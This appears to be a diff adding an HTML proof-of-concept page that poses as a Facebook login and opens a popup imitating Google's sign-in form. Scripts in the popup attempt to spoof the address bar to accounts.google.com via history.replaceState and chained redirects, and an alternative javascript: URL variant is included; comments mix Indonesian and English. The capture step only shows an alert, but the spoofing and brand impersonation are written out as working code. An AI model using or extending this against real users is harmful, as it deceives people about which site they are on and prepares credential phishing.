@@ -1,0 +1,147 @@
+<html>
+<head>
+    <title>Facebook Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f0f2f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .fb-btn {
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #65676b;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Connect with Facebook</h2>
+        <p>Click the button below to continue with Facebook login</p>
+        
+        <button class="fb-btn" onclick="triggerExploit()">
+            Continue with Facebook
+        </button>
+        
+        <div class="footer">
+            By continuing, you agree to our Terms of Service
+        </div>
+    </div>
+
+    <script>
+        function triggerExploit() {
+            // Technique 1: Direct popup dengan address bar spoofing
+            const w = window.open('', '_blank', 'width=400,height=500');
+            
+            // Cepat-cepat write content dan spoof address bar
+            w.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Google Account</title>
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <style>
+                        body {
+                            font-family: Arial, sans-serif;
+                            margin: 0;
+                            padding: 20px;
+                            background: white;
+                        }
+                        .google-header {
+                            text-align: center;
+                            padding: 20px 0;
+                        }
+                        .login-box {
+                            max-width: 400px;
+                            margin: 0 auto;
+                        }
+                        input, button {
+                            width: 100%;
+                            padding: 12px;
+                            margin: 8px 0;
+                            border: 1px solid #dadce0;
+                            border-radius: 4px;
+                            box-sizing: border-box;
+                        }
+                        button {
+                            background: #1a73e8;
+                            color: white;
+                            border: none;
+                            cursor: pointer;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="google-header">
+                        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="120" alt="Google">
+                    </div>
+                    
+                    <div class="login-box">
+                        <h2>Sign in</h2>
+                        <p>Use your Google Account</p>
+                        
+                        <input type="email" placeholder="Email or phone" id="email">
+                        <button onclick="fakeLogin()">Next</button>
+                        
+                        <p style="font-size: 14px; color: #5f6368; margin-top: 30px;">
+                            <a href="#" style="color: #1a73e8; text-decoration: none;">Forgot email?</a>
+                        </p>
+                    </div>
+
+                    <script>
+                        // CRITICAL: Spoof address bar immediately
+                        try {
+                            history.replaceState({}, "Google Account", "https://accounts.google.com");
+                        } catch(e) {}
+                        
+                        function fakeLogin() {
+                            const email = document.getElementById('email').value;
+                            alert('This is fake: ' + email);
+                        }
+                        
+                        // Trigger redirect yang akan di-block Facebook
+                        setTimeout(() => {
+                            // Redirect yang memicu dialog "Lanjutkan dengan browser"
+                            window.location.href = "https://www.google.com";
+                        }, 1000);
+                        
+                        // Backup: Multiple redirect attempts
+                        setTimeout(() => {
+                            window.location.replace("https://accounts.google.com");
+                        }, 1500);
+                    <\/script>
+                </body>
+                </html>
+            `);
+            w.document.close();
+        }
+        
+        // Alternative technique untuk testing
+        function alternativeExploit() {
+            // Pakai javascript URL untuk immediate execution
+            window.open("javascript:history.replaceState({},'Google','https://accounts.google.com');document.write('<div style=\"padding:20px\"><h2>Google Sign-in</h2><p>Please wait...</p></div>');setTimeout(()=>{location.href='https://google.com'},800);", "_blank");
+        }
+    </script>
+</body>
+</html>
